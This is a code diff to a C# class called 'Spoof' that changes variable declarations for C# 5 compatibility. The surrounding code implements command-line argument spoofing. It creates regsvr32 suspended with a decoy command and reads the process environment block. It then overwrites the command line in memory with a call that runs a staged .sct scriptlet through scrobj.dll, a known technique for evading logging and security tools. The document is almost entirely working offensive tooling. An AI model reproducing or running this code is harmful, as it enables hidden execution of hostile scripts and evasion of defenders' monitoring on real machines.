@@ -168,7 +168,7 @@ public static class Spoof
 
         siEx.lpAttributeList = attrList;
 
-        PROCESS_INFORMATION pi;
+        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
         bool created = CreateProcess(null, cmdLine,
             IntPtr.Zero, IntPtr.Zero, false,
             EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
@@ -190,6 +190,17 @@ public static class Spoof
 
     public static void Go()
     {
+        // C# 5 compatible: all out vars pre-declared (no inline out var declarations)
+        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+        PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
+        int retLen = 0;
+        int bytesRead = 0;
+        int written = 0;
+        IntPtr pebBuf = IntPtr.Zero;
+        IntPtr cmdBuf = IntPtr.Zero;
+        IntPtr processParametersPtr = IntPtr.Zero;
+        IntPtr bufferPtr = IntPtr.Zero;
+
         string spoofedCmd = "regsvr32 /s C:\\Windows\\System32\\jscript.dll";
         string realCmd = "regsvr32 /s /n /u /i:\"C:\\ProgramData\\Microsoft\\Crypto\\RSA\\MachineKeys\\stage.sct\" scrobj.dll";
 
@@ -197,14 +208,14 @@ public static class Spoof
         si.cb = Marshal.SizeOf(typeof(STARTUPINFO));
 
         if (!CreateProcessW(null, spoofedCmd, IntPtr.Zero, IntPtr.Zero, false,
-            CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out PROCESS_INFORMATION pi))
+            CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi))
         {
             return;
         }
 
         if (NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation,
-            out PROCESS_BASIC_INFORMATION pbi, Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)),
-            out int retLen) != 0)
+            out pbi, Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)),
+            out retLen) != 0)
         {
             ResumeThread(pi.hThread);
             CloseHandle(pi.hProcess);
@@ -212,8 +223,8 @@ public static class Spoof
             return;
         }
 
-        IntPtr pebBuf = Marshal.AllocHGlobal(IntPtr.Size * 4);
-        if (!ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, pebBuf, IntPtr.Size * 4, out int bytesRead))
+        pebBuf = Marshal.AllocHGlobal(IntPtr.Size * 4);
+        if (!ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, pebBuf, IntPtr.Size * 4, out bytesRead))
         {
             Marshal.FreeHGlobal(pebBuf);
             ResumeThread(pi.hThread);
@@ -223,10 +234,10 @@ public static class Spoof
         }
 
         int ppOffset = IntPtr.Size == 8 ? 0x20 : 0x10;
-        IntPtr processParametersPtr = Marshal.ReadIntPtr(pebBuf, ppOffset);
+        processParametersPtr = Marshal.ReadIntPtr(pebBuf, ppOffset);
         Marshal.FreeHGlobal(pebBuf);
 
-        IntPtr cmdBuf = Marshal.AllocHGlobal(16);
+        cmdBuf = Marshal.AllocHGlobal(16);
         if (!ReadProcessMemory(pi.hProcess, IntPtr.Add(processParametersPtr, CommandLineOffset), cmdBuf, 16, out bytesRead))
         {
             Marshal.FreeHGlobal(cmdBuf);
@@ -237,10 +248,10 @@ public static class Spoof
         }
 
         byte[] newCmdBytes = Encoding.Unicode.GetBytes(realCmd);
-        IntPtr bufferPtr = Marshal.ReadIntPtr(cmdBuf, 8);
+        bufferPtr = Marshal.ReadIntPtr(cmdBuf, 8);
         Marshal.FreeHGlobal(cmdBuf);
 
-        if (!WriteProcessMemory(pi.hProcess, bufferPtr, newCmdBytes, newCmdBytes.Length, out int written))
+        if (!WriteProcessMemory(pi.hProcess, bufferPtr, newCmdBytes, newCmdBytes.Length, out written))
         {
             ResumeThread(pi.hThread);
             CloseHandle(pi.hProcess);
